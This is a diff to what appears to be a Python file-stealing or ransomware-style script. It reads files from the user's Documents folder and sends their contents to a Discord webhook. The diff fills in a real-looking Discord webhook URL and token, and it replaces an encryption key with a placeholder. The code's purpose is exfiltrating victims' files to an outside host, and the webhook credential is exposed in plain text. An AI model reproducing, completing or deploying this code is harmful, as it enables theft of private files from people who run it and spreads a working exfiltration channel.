@@ -8,7 +8,7 @@ import platform
 
 uname = platform.uname()
 
-webhook_url = 'oseuwebhookaqui'
+webhook_url = 'https://discord.com/api/webhooks/1286181747595280384/TE2w2m3QgeRCWPVdJKwX-8PkW7-PtKVuQDHiNockTO8v7WidM2eEyILOSf8JzGvmnXbn'
 
 def send_webhook_message(message, title="Files Contents", color='FF0000'):
 
@@ -32,7 +32,7 @@ def send_webhook(file_path, content, encoded=True):
     message = f'File: {file_path}\nContent: \n{real_content}'
     send_webhook_message(message)
     
-key = b'znUiQoxmzAEvm_WWcQngapMLv_dLrf5C661SL-ZyL6Q='
+key = b'suakeyaqui'
 
 if uname.system == "Linux":
       dir = f"/home/{uname.node}/Documents/"
